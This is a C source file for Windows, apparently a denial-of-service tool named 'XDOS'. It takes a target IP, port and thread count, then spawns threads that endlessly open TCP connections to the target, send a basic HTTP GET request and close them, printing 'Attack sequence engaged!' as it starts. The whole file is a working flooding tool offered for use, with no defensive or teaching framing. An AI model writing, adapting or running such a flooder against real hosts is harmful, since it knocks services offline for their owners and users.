#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>

unsigned long thread = 0;

static int connect_tv(struct sockaddr_in *addr, int timeout);
static DWORD WINAPI dosmain(LPVOID p);
const int main(int argc, char *argv[])
{
	if(argc != 4) {
		puts("\t\t\t\tXDOS - by Bull Moose\n");
		printf("Usage: %s [IP] [Port] [Threads]\n",argv[0]);
		return 1;
	}
	puts("Initiating xdos...\n");
	struct sockaddr_in saddr;
	unsigned long tid;
	int i;
	
	memset(&saddr, '\0', sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(argv[1]);
	saddr.sin_port = (short)htons(atoi(argv[2]));
		
	for(i = 1; i <= atoi(argv[3]); i++) CreateThread(0,0,dosmain,(LPVOID)&saddr,0,&tid);
	puts("Attack sequence engaged!\n");
	dosmain(&saddr);
	return 0;
}
static int connect_tv(struct sockaddr_in *addr, int timeout)
{
	int s;
	unsigned long i;
	fd_set wr_fds, err_fds;
	struct timeval tv;

	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == 0 || s == INVALID_SOCKET) return 0;

	tv.tv_sec = timeout / 1000;
	tv.tv_usec = 0;

	i = 1;
	ioctlsocket(s, FIONBIO, &i);

	for (;;) {
		i = connect(s, (struct sockaddr *)addr, sizeof(struct sockaddr_in));
		if (i != SOCKET_ERROR)
			goto exit_connected;
		i = WSAGetLastError();
		if (i == WSAENOBUFS) {
			Sleep(50);
			continue;
		}
		if (i == WSAEWOULDBLOCK)
			break;
		goto exit_err;
	}

	FD_ZERO(&wr_fds);
	FD_SET(s, &wr_fds);
	FD_ZERO(&err_fds);
	FD_SET(s, &err_fds);
	i = select(s+1, NULL, &wr_fds, &err_fds, &tv);

	if (i == 0 || i == -1)
		goto exit_err;		
	if (FD_ISSET(s, &err_fds) || !FD_ISSET(s, &wr_fds))
		goto exit_err;

exit_connected:
	i = 0;
	ioctlsocket(s, FIONBIO, &i);
	return s;

exit_err:
	closesocket(s);
	return 0;
}
static DWORD WINAPI dosmain(LPVOID p)
{
	extern unsigned long thread;
	thread++;

	printf("Thread number %u initiated!\n",thread);
	struct sockaddr_in addr;
	char Buffer[] = \
		"GET / HTTP/1.1\r\n"
		"Host: 127.0.0.1\r\n\r\n";
	SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_BELOW_NORMAL);
	int sock;
	if (p == NULL) goto ex;
	addr = *(struct sockaddr_in *)p;
	for (;;) {
		sock = connect_tv(&addr, 8);
		if (sock != 0) {
			send(sock,Buffer,strlen(Buffer),0);
			Sleep(300);
			closesocket(sock);
		} else if(sock==SOCKET_ERROR) {
			puts("Error: Socket Error.\n");
			ExitProcess(1);
		}
	}
ex:	ExitThread(0);
	return 0;
}
